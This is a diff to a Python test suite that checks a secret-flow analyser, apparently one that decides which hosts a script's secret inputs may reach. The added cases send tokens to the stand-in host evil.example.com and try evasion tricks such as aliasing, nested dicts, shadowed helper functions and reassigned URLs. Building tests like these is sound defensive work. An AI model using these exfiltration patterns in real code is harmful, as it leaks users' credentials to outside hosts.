@@ -153,13 +153,41 @@ class TestSecretHosts(SimpleTestCase):
             (
                 "secret_used_outside_any_fetch",
                 """
-                let hashed := sha256Hex(inputs.salt)
-                print(hashed)
-                fetch('https://hooks.example.com', {'body': event.properties})
+                if (sha256Hex(inputs.salt) == event.properties.signature) {
+                  fetch('https://hooks.example.com', {'body': event.properties})
+                }
                 """,
                 _inputs(salt="s"),
                 {"salt"},
                 {"salt": _origins()},
+            ),
+            (
+                "secret_printed",
+                f"print(base64Encode(inputs.token))\n{SENDS_TOKEN_TO_URL}",
+                _inputs(url="https://hooks.example.com", token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "secret_captured_in_an_event",
+                "postHogCapture({'event': 'leak', 'properties': {'value': inputs.token}})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "secret_in_an_error",
+                "throw Error(base64Encode(inputs.token))",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "print_called_through_another_name",
+                "let log := print\nlog(inputs.token)",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
             ),
             (
                 "input_that_references_a_secret",
@@ -188,6 +216,87 @@ class TestSecretHosts(SimpleTestCase):
                 _inputs(secret_headers={"Authorization": "Bearer t"}),
                 {"secret_headers"},
                 {"secret_headers": _origins("https://evil.example.com")},
+            ),
+            (
+                "secret_assigned_into_a_dict_through_an_alias",
+                "let h := {}\nlet a := h\na.Authorization := inputs.token\nfetch('https://evil.example.com', {'headers': h})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://evil.example.com")},
+            ),
+            (
+                "secret_assigned_into_a_dict_through_a_parameter",
+                """
+                let h := {}
+                fun put(d) { d.Authorization := inputs.token }
+                put(h)
+                fetch('https://evil.example.com', {'headers': h})
+                """,
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://evil.example.com")},
+            ),
+            (
+                "secret_assigned_into_a_nested_dict",
+                """
+                let inner := {}
+                let p := {'headers': inner}
+                p.headers.Authorization := inputs.token
+                fetch('https://evil.example.com', {'headers': inner})
+                """,
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://evil.example.com")},
+            ),
+            (
+                "url_input_reassigned",
+                f"inputs.url := 'https://evil.example.com'\n{SENDS_TOKEN_TO_URL}",
+                _inputs(url="https://hooks.example.com", token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "url_input_reassigned_through_an_alias",
+                f"let i := inputs\ni.url := 'https://evil.example.com'\n{SENDS_TOKEN_TO_URL}",
+                _inputs(url="https://hooks.example.com", token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "secret_assigned_through_an_alias_and_printed",
+                "let h := {}\nlet a := h\na.Authorization := inputs.token\nprint(h)",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "user_function_named_like_concat",
+                "fun concat(a, b) { return 'https://evil.example.com/' }\n"
+                "fetch(concat('https://hooks.example.com/', 'x'), {'headers': {'Authorization': inputs.token}})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "lambda_named_like_coalesce",
+                "let coalesce := (a, b) -> 'https://evil.example.com/'\n"
+                "fetch(coalesce('https://hooks.example.com/a', 'https://hooks.example.com/b'), {'headers': {'Authorization': inputs.token}})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
+                "function_declared_twice",
+                """
+                fun send(url, secret) { fetch(url, {'headers': {'Authorization': secret}}) }
+                fun unused() {
+                  fun send(ignored, copy) { fetch('https://hooks.example.com', {'headers': {'Authorization': copy}}) }
+                }
+                send('https://evil.example.com', inputs.token)
+                """,
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
             ),
             (
                 "option_key_assigned_through_an_index",
